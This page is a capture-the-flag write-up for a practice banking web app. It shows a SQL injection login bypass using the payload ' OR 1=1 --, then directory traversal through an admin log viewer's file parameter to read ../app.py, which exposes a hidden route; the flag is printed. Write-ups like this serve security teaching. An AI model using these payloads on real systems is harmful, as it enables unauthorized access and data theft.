<!doctype html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Ukrainian National CTF 2025 ‚Äì Task 20 (SecureBank ‚Äì SQLi + LFI)</title>
    <meta name="description" content="Writeup for Task 20 SecureBank (SQL injection + LFI) from Ukrainian National CTF 2025 by Alexandru Hossu.">
    <meta property="og:title" content="Task 20 ‚Äì SecureBank (SQLi + LFI)" />
    <meta property="og:locale" content="en_US" />
    <meta property="og:type" content="article" />
    <meta name="twitter:card" content="summary" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

    <link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/jpeg" href="../avatar.jpg">

    <style>
      :root { --bg:#121212; --fg:#e0e0e0; --accent:#61dafb; --border:#333; --muted:#a0a0a0; }
      * { box-sizing:border-box; }
      body { margin:0; padding:0; background:var(--bg); color:var(--fg); font-family:'Work Sans',sans-serif; line-height:1.6; }
      a { color:var(--accent); text-decoration:none; }
      a:hover { text-decoration:underline; }
      .wrapper { max-width:768px; margin:0 auto; padding:2rem 1rem 3rem; }
      .site-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:3rem; }
      .site-title { font-weight:700; font-size:1.5rem; color:var(--fg); }
      .site-logo { height:48px; width:48px; border-radius:50%; object-fit:cover; }
      .post { max-width:768px; margin:0 auto; }
      .post-header h1 { margin:0 0 0.5rem; font-size:2rem; font-weight:500; }
      .post-subtitle { margin:0 0 0.75rem; opacity:0.8; font-size:1rem; }
      .post-meta { margin:0 0 1.5rem; font-size:0.9rem; color:var(--muted); display:flex; flex-wrap:wrap; gap:0.75rem; }
      .post-tags { display:flex; flex-wrap:wrap; gap:0.4rem; margin-top:0.4rem; }
      .tag { font-size:0.75rem; padding:0.15rem 0.5rem; border-radius:999px; border:1px solid var(--border); background:rgba(255,255,255,0.02); }
      .post-toc { margin:2rem 0; padding:1rem 1.25rem; border-radius:0.75rem; border:1px solid var(--border); background:#181818; }
      .post-toc-title { margin:0 0 0.5rem; font-size:0.95rem; font-weight:500; text-transform:uppercase; letter-spacing:0.06em; opacity:0.8; }
      .post-toc ul { margin:0; padding-left:1.25rem; font-size:0.95rem; }
      .post-toc li { margin:0.1rem 0; }
      section + section { margin-top:2rem; }
      h2 { font-size:1.4rem; margin-bottom:0.5rem; font-weight:500; }
      h3 { font-size:1.15rem; margin-bottom:0.4rem; font-weight:500; }
      p { margin:0 0 0.9rem; }
      ul,ol { padding-left:1.25rem; margin-top:0; margin-bottom:0.9rem; }
      code { font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace; font-size:0.9rem; background:rgba(255,255,255,0.04); padding:0.15rem 0.3rem; border-radius:0.25rem; }
      pre { margin:0 0 1.25rem; padding:0.85rem 1rem; background:#0b0b0b; border-radius:0.5rem; border:1px solid #1f1f1f; overflow-x:auto; }
      pre code { background:transparent; padding:0; }
      .note { padding:0.75rem 1rem; border-radius:0.5rem; border:1px solid var(--border); background:#181818; font-size:0.92rem; margin-bottom:1rem; }
      .back-link { margin:0 0 2rem; font-size:0.95rem; }
      .site-footer { border-top:1px solid var(--border); margin-top:3rem; padding-top:1rem; display:flex; justify-content:space-between; align-items:center; }
      .site-footer p { margin:0; font-size:0.9rem; opacity:0.6; }
    </style>
  </head>
  <body>
    <div class="wrapper">
      <header class="site-header">
        <a href="/" class="site-title">Alexandru Hossu</a>
        <img src="../avatar.jpg" alt="Logo" class="site-logo">
      </header>

      <article class="post">
        <p class="back-link">
          ‚Üê <a href="index.html">Back to all writeups</a>
        </p>

        <header class="post-header">
          <h1>Ukrainian National CTF 2025 ‚Äì Task 20 (SecureBank ‚Äì SQLi + LFI)</h1>
          <p class="post-subtitle">
            Banking web app with a classic SQL injection login bypass and a directory traversal /
            LFI in the admin log viewer that leaks the flag route from the source.
          </p>
          <p class="post-meta">
            <span>Category: Web</span>
            <span>CTF: Ukrainian National CTF 2025</span>
          </p>
          <div class="post-tags">
            <span class="tag">SQL Injection</span>
            <span class="tag">LFI</span>
            <span class="tag">Flask</span>
          </div>
        </header>

        <nav class="post-toc">
          <p class="post-toc-title">On this page</p>
          <ul>
            <li><a href="#context">0. Context</a></li>
            <li><a href="#sqli">1. SQL injection login bypass</a></li>
            <li><a href="#lfi">2. Directory traversal in logs</a></li>
            <li><a href="#source">3. Reading the Flask source</a></li>
            <li><a href="#flag">4. Secret route ‚Üí flag</a></li>
          </ul>
        </nav>

        <section id="context">
          <h2>0. Context</h2>
          <p>
            SecureBank is a small Flask-style ‚Äúonline banking‚Äù app. The description hints at SQLi, XSS,
            directory traversal and command injection, but for the flag we only need SQLi + LFI.
          </p>
        </section>

        <section id="sqli">
          <h2>1. SQL injection login bypass</h2>
          <p>
            The home page shows a standard login form. I tried a classic SQLi payload in the username field:
          </p>
          <pre><code>' OR 1=1 --</code></pre>
          <p>
            Password can be anything. The backend likely does something like:
          </p>
          <pre><code>SELECT * FROM users
WHERE username = '&lt;input&gt;' AND password = MD5('&lt;password&gt;');</code></pre>
          <p>
            With the injected condition, the <code>WHERE</code> clause always evaluates to true and I get
            logged in as an admin user.
          </p>
        </section>

        <section id="lfi">
          <h2>2. Directory traversal in logs</h2>
          <p>
            Inside the admin area there‚Äôs a ‚ÄúLog viewer‚Äù that loads files via a <code>file</code> parameter:
          </p>
          <pre><code>/admin/logs?file=access.log</code></pre>
          <p>
            Trying simple traversal:
          </p>
          <pre><code>/admin/logs?file=../flag.txt</code></pre>
          <p>
            showed that the server was indeed including arbitrary files from disk. The flag wasn‚Äôt directly
            there though, so I used the LFI to read application source instead.
          </p>
        </section>

        <section id="source">
          <h2>3. Reading the Flask source</h2>
          <p>
            Guessing the app‚Äôs layout, I requested:
          </p>
          <pre><code>/admin/logs?file=../app.py</code></pre>
          <p>
            That returned the full Flask application source code. Looking through it, there was a hidden route:
          </p>
          <pre><code>@app.route('/secret/flag')
def get_flag():
    return "üö© CTF{The_fire_of_the_fierce_does_not_burn}"</code></pre>
        </section>

        <section id="flag">
          <h2>4. Secret route ‚Üí flag</h2>
          <p>
            Since I was already authenticated (thanks to SQLi), I just browsed to:
          </p>
          <pre><code>/secret/flag</code></pre>
          <p>
            and the application responded with:
          </p>
          <pre><code>CTF{The_fire_of_the_fierce_does_not_burn}</code></pre>
        </section>
      </article>

      <footer class="site-footer">
        <p>2025 ¬© Alexandru Hossu</p>
      </footer>
    </div>
  </body>
</html>